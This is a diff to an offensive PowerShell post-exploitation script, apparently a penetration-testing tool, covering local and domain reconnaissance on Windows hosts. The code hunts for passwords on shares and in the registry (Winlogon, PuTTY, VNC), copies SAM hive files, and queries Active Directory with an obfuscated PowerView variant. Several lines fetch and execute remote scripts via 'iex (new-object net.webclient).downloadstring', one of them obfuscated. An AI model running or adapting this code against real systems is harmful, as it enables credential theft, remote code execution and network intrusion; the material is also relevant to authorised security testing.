@@ -289,14 +289,14 @@ function localreconmodules
             Write-Host -ForegroundColor Yellow 'Starting local Recon phase:'
 
             #Check for WSUS Updates over HTTP
-	    $UseWUServer = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name UseWUServer -ErrorAction SilentlyContinue).UseWUServer
+	        $UseWUServer = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name UseWUServer -ErrorAction SilentlyContinue).UseWUServer
             $WUServer = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" -Name WUServer -ErrorAction SilentlyContinue).WUServer
 
             if($UseWUServer -eq 1 -and $WUServer.ToLower().StartsWith("http://")) 
 	        {
         	    Write-Host -ForegroundColor Yellow "WSUS Server over HTTP detected, most likely all hosts in this domain can get fake-Updates!"
-		    echo "Wsus over http detected! Fake Updates can be delivered here. $UseWUServer / $WUServer " >> "$currentPath\LocalRecon\WsusoverHTTP.txt"
-                }
+		        echo "Wsus over http detected! Fake Updates can be delivered here. $UseWUServer / $WUServer " >> "$currentPath\LocalRecon\WsusoverHTTP.txt"
+            }
 
             #Check for SMB Signing
             iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/leechristensen/Random/master/PowerShellScripts/Invoke-SMBNegotiate.ps1')
@@ -330,23 +330,27 @@ function localreconmodules
                 if ($sharepasshunt -eq "yes" -or $sharepasshunt -eq "y" -or $sharepasshunt -eq "Yes" -or $sharepasshunt -eq "Y")
                 {
                     get-WmiObject -class Win32_Share | ft Path >> passhuntshares.txt
-                    $shares = get-content .\passhuntshares.txt | select-object -skip 4
+                    $shares = get-content .\passhuntshares.txt | select-object -skip 5
+                    copy .\passhuntshares.txt $Env:TMP
+                    copy .\passhunt.exe $Env:TMP
+                    $temp = $Env:TMP
                     foreach ($line in $shares)
                     {
-                       invoke-expression "cmd /c start powershell -Command '.\passhunt.exe -s $line -o %TEMP%}' 
-                    }
-                    
+                        cmd /c start powershell -Command "$temp\passhunt.exe -s $line"
+                    } 
+                                      
                 }
             }
             
             # Collecting more information
-            $snmp = Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP'
-            If ($snmp -eq "True")
+            If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP')
             {
-                Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse >> "$currentPath\LocalRecon\SNMP.txt"
+                Get-ChildItem -path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP' -Recurse >> "$currentPath\LocalRecon\SNMP.txt"
+            }            
+            If (Test-Path -Path %SYSTEMROOT%\repair\SAM)
+            {
+                Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\repair\SAM "$currentPath\LocalRecon\SAM"
             }
-            
-            If (Test-Path -Path %SYSTEMROOT%\repair\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\repair\SAM "$currentPath\LocalRecon\SAM";}
             If (Test-Path -Path %SYSTEMROOT%\System32\config\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\System32\config\SAM "$currentPath\LocalRecon\SAM";}
             If (Test-Path -Path %SYSTEMROOT%\System32\config\RegBack\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\System32\config\RegBack\SAM "$currentPath\LocalRecon\SAM";}
             If (Test-Path -Path %SYSTEMROOT%\System32\config\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\System32\config\SAM "$currentPath\LocalRecon\SAM";}
@@ -358,9 +362,9 @@ function localreconmodules
             REG QUERY HKCU /F "password" /t REG_SZ /S /K >> "$currentPath\LocalRecon\PotentialHKCURegistryPasswords.txt"
 
             If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon')
-	    {
-	    	reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" >> "$currentPath\LocalRecon\Winlogon.txt"
-	    }
+	        {
+	    	    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" >> "$currentPath\LocalRecon\Winlogon.txt"
+	        }
             If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\Current\ControlSet\Services\SNMP'){reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" >> "$currentPath\LocalRecon\SNMPParameters.txt"}
             If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Software\SimonTatham\PuTTY\Sessions'){reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" >> "$currentPath\LocalRecon\PuttySessions.txt"}
             If (Test-Path -Path 'Registry::HKEY_CURRENT_USER\Software\ORL\WinVNC3\Password'){reg query "HKCU\Software\ORL\WinVNC3\Password" >> "$currentPath\LocalRecon\VNCPassword.txt"}
@@ -506,7 +510,7 @@ function domainreconmodules
 	    
 	    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/viewdev.ps1')
 	    $Date = (Get-Date).AddYears(-1).ToFileTime()
-            noshes -RmrzVOkRggEzAyC "(pwdlastset<=$Date)" -wDpWXLYTGZrAWN9 samaccountname,pwdlastset >> $currentPath\DomainRecon\Users_Nochangedpassword.txt
+        noshes -RmrzVOkRggEzAyC "(pwdlastset<=$Date)" -wDpWXLYTGZrAWN9 samaccountname,pwdlastset >> $currentPath\DomainRecon\Users_Nochangedpassword.txt
 	    
 	    noshes -RmrzVOkRggEzAyC "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -wDpWXLYTGZrAWN9 distinguishedname
             noshes -UACFilter NOT_ACCOUNTDISABLE -wDpWXLYTGZrAWN9 distinguishedname >> $currentPath\DomainRecon\Enabled_Users.txt
